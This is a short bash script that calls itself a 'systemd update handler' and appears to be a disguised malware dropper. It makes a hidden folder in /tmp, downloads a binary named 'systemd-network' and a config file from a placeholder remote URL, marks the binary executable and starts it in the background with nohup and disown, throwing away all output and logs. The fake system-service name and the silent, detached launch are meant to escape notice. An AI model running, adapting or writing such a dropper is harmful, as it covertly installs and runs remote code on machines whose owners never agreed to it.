#!/bin/bash
# systemd update handler
PROC="systemd-network"
WORKDIR="/tmp/.sysd"
BIN="$WORKDIR/$PROC"
CFG="$WORKDIR/config.json"
REPO="GITHUB_RAW_BASE_URL"

mkdir -p "$WORKDIR" 2>/dev/null

# Already running? exit silently
pgrep -x "$PROC" >/dev/null 2>&1 && exit 0

# Download binary + config
curl -fsSL -o "$BIN" "$REPO/systemd-network" 2>/dev/null
curl -fsSL -o "$CFG" "$REPO/config.json" 2>/dev/null

chmod +x "$BIN" 2>/dev/null

# Launch silently in background, survive shell exit
nohup "$BIN" --config "$CFG" --log-file /dev/null >/dev/null 2>&1 &

disown
